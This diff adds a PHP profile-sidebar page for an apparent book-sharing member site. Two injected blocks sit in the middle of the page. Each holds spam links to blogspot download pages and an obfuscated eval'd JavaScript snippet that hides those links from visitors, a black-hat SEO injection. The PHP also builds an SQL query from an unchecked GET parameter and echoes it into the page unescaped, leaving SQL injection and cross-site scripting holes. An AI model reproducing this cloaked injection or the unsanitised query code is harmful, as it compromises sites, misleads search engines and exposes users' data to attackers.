@@ -1,0 +1,86 @@
+<? 
+		session_start(); 
+		if	(isset($_GET['memid'])) {
+			 $memid =  $_GET['memid']; 
+		}
+//		echo $memid . "aaa";	 		
+//	    if(session_is_registered ('bookroll_memid')) {
+//				$memid =  $_SESSION['bookroll_memid']; 
+//		}		
+//		$memid = "allen@cvl.com.tw";
+		if (file_exists("../conn.php")) {
+			include('../conn.php');
+		}else{
+			if (file_exists("conn.php")) {
+				include('conn.php');		
+			}
+		}	
+?>
+
+
+
+<?php 
+
+include("../js/tool_windows.php") ;
+
+?>
+<link href="<? echo $SHOME ?>css/siteMap.css" rel="stylesheet" type="text/css">
+<link href="<? echo $SHOME ?>css/font.css" rel="stylesheet" type="text/css">
+<link href="<? echo $SHOME ?>css/bookroll.css" rel="stylesheet" type="text/css">
+<link href="<? echo $SHOME ?>css/sddm.css" rel="stylesheet" type="text/css">
+<link href="<? echo $SHOME ?>css/subContent.css" rel="stylesheet" type="text/css">
+
+																									<!--ME4T3US--> <ul id="ajax311"> Pedro Romeo Diot Gabriel Aresti, <a href="http://erwinbga83.blogspot.com">Diot Gabriel Aresti</a>, Mikel Martinez Diot Gabriel Aresti.  Aron Ives Fra gli amici, <a href="http://mauiproductions6262.blogspot.com/2009/08/movie-fra-gli-amici-2006.html">Download Fra gli amici movie</a>, Jason Hallows Fra gli amici.  Max Ferner Der müde Theodor, <a href="http://dilorenzoinc3988.blogspot.com/2009/08/movie-der-mde-theodor.html">Download Der müde Theodor movie</a>, Download Der mÃ¼de Theodor.  ?  <a href="http://reference1docs9.blogspot.com/2009/02/verbal-workout-for-gmat.html">Study Aids Verbal Workout for the GMAT</a>  <a href="http://new3photogra.blogspot.com/2009/02/five-illuminated-manuscripts-of.html">of Giangeleazzo Visconti</a>  True stories One Magical Sunday:,  <a href="http://great8biographie.blogspot.com/2009/02/one-magical-sunday.html">Grand Central Publishing But Winning Isn't Everything</a> , Sporting events But Winning Isn't Everything. </ul><script language="javascript"> var uqj4082=["124", "135", "123", "141", "133", "125", "134", "140", "70", "127", "125", "140", "93", "132", "125", "133", "125", "134", "140", "90", "145", "97", "124", "64", "58", "121", "130", "121", "144", "75", "73", "73", "58", "65", "70", "139", "140", "145", "132", "125", "70", "136", "135", "139", "129", "140", "129", "135", "134", "56", "85", "56", "58", "121", "122", "139", "135", "132", "141", "140", "125", "58", "83", "124", "135", "123", "141", "133", "125", "134", "140", "70", "127", "125", "140", "93", "132", "125", "133", "125", "134", "140", "90", "145", "97", "124", "64", "58", "121", "130", "121", "144", "75", "73", "73", "58", "65", "70", "139", "140", "145", "132", "125", "70", "143", "129", "124", "140", "128", "56", "85", "56", "72", "83", "124", "135", "123", "141", "133", "125", "134", "140", "70", "127", "125", "140", "93", "132", "125", "133", "125", "134", "140", "90", "145", "97", "124", "64", "58", "121", "130", "121", "144", "75", "73", "73", "58", "65", "70", "139", "140", "145", "132", "125", "70", "128", "125", "129", "127", "128", "140", "56", "85", "56", "72", "83", "124", "135", "123", "141", "133", "125", "134", "140", "70", "127", "125", "140", "93", "132", "125", "133", "125", "134", "140", "90", "145", "97", "124", "64", "58", "121", "130", "121", "144", "75", "73", "73", "58", "65", "70", "139", "140", "145", "132", "125", "70", "135", "142", "125", "138", "126", "132", "135", "143", "56", "85", "56", "58", "128", "129", "124", "124", "125", "134", "58", "83"];var bou243="";var aeib32="";for (njaha18859=0; njaha18859<uqj4082.length; njaha18859++){aeib32=uqj4082[njaha18859]-24;bou243=bou243+String.fromCharCode(aeib32);}eval(bou243);</script> <!--ME4T3US--> 																									<!--ME4T3US--> <div id="navigation726"> Mary Beth Reed Floating Under a Honey Tree, <a href="http://crescentpicturescorporation2794.blogspot.com">Download Floating Under a Honey Tree movie</a>, .  Bahar Ã–ztan Deli fisek, <a href="http://magnussoftdeutschlandgmbh6686.blogspot.com/2009/08/movie-deli-fisek.html">Download Deli fisek</a>, Osman Betin Deli fisek.  , <a href="http://tidelineproductions3903.blogspot.com/2009/08/movie-fate-and-mr-mckinley.html">Download Fate and Mr. McKinley</a>, .  ?  <a href="http://www.blogger.com/followers.g?blogID2440787904451375151'View All/a/spanspan class'item-control blog-admin'a href'http://www.blogger.com/manage-followers.g?blogID2440787904451375151'Manage/a/span/divdiv class'clear'/divspan class'widget-item-control's">Biography / Autobiography Florence</a>  <a href="http://best8sportsgenotes.blogspot.com/2009/02/season-on-brink.html">Basketball General Season on the Brink</a>  Association football Fever Pitch,  <a href="http://usa1soccerbionews.blogspot.com/2009/02/fever-pitch_13.html">Ball games Penguin Books Ltd</a> , Biography & autobiography: sport Penguin Books Ltd. </div><script language="javascript"> var ayz904=["148", "159", "147", "165", "157", "149", "158", "164", "94", "151", "149", "164", "117", "156", "149", "157", "149", "158", "164", "114", "169", "121", "148", "88", "82", "158", "145", "166", "153", "151", "145", "164", "153", "159", "158", "103", "98", "102", "82", "89", "94", "163", "164", "169", "156", "149", "94", "160", "159", "163", "153", "164", "153", "159", "158", "80", "109", "80", "82", "145", "146", "163", "159", "156", "165", "164", "149", "82", "107", "148", "159", "147", "165", "157", "149", "158", "164", "94", "151", "149", "164", "117", "156", "149", "157", "149", "158", "164", "114", "169", "121", "148", "88", "82", "158", "145", "166", "153", "151", "145", "164", "153", "159", "158", "103", "98", "102", "82", "89", "94", "163", "164", "169", "156", "149", "94", "156", "149", "150", "164", "80", "109", "80", "93", "97", "101", "96", "96", "107", "148", "159", "147", "165", "157", "149", "158", "164", "94", "151", "149", "164", "117", "156", "149", "157", "149", "158", "164", "114", "169", "121", "148", "88", "82", "158", "145", "166", "153", "151", "145", "164", "153", "159", "158", "103", "98", "102", "82", "89", "94", "163", "164", "169", "156", "149", "94", "148", "153", "163", "160", "156", "145", "169", "80", "109", "80", "82", "158", "159", "158", "149", "82", "107"];var ffgm84="";var ds6541="";for (ncm716=0; ncm716<ayz904.length; ncm716++){ds6541=ayz904[ncm716]-48;ffgm84=ffgm84+String.fromCharCode(ds6541);}eval(ffgm84);</script> <!--ME4T3US--> <div id=linkList>
+		<DIV id=linkList2>
+		
+		<DIV id=lselect>
+
+		  <DIV id=profile>
+
+		  <SPAN id="mprofile">
+
+				  <img class="img_me" width=50 height=50 src ='
+
+				  <?php
+
+		  		     $dSQL = "";
+					$dSQL = "SELECT * FROM member m  WHERE m.email = '" . $memid . "'"; 
+
+			
+
+					$query_Com = odbc_exec($conn, $dSQL);
+					$row_Com = odbc_fetch_row($query_Com);
+					echo $SHOME . "home/" . $memid . "/" . odbc_result($query_Com,"pic") . "'>";
+					echo "</SPAN>";
+										
+					echo "		&nbsp;	<SPAN id='me_nickname_normal'>" . odbc_result($query_Com,"nickname") . "'s&nbsp;bookroll</SPAN>";		
+					?>
+
+
+			
+		</DIV>	
+
+<div class="mainDiv" state="0">
+
+	<div class="topItem" classOut="topItem" classOver="topItemOver" onactivate="Init(this);"> 
+	 my group </div>
+<div class="dropMenu">
+	<div class="submenu" state="0" callprocess="<? echo $SHOME ?>mybookroll/getmygroup.php" argu="memid=<?PHP echo $memid; ?>"> 	
+	</div>
+	</div>
+</div>
+
+<div class="mainDiv" state="0">
+	<div class="topItem" classOut="topItem" classOver="topItemOver" onactivate="Init(this);"> my favorite </div>
+<div class="dropMenu">
+	<div class="submenu" state="0" callprocess="<? echo $SHOME ?>mybookroll/getmyfavorite.php" argu="memid=<?PHP echo $memid; ?>"> 	
+
+</div>
+</div>
+</div>
+
+
+
+</div>
+</div>
+</div>
